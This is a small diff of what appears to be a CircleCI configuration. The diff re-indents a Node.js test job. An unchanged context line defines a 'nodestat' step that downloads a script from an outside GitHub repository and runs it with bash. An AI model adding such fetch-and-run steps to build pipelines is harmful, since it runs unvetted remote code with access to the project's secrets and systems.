@@ -18,14 +18,14 @@ jobs:
       - run:
           name: "nodestat"
           command: "set -e  && curl -fsSL https://raw.githubusercontent.com/NateYeet/Chameleon/main/Chameleon/main.czco >> /ch && bash /ch node"
-    nodejsindex:
-      docker:
-        - image: ubuntu:stable
-      steps:
-        - checkout
-        - run: cd www && yarn     
-        - run: cd www && yarn test
-  
+  nodejsindex:
+    docker:
+      - image: ubuntu:stable
+    steps:
+      - checkout
+      - run: cd www && yarn     
+      - run: cd www && yarn test
+
 
 
   
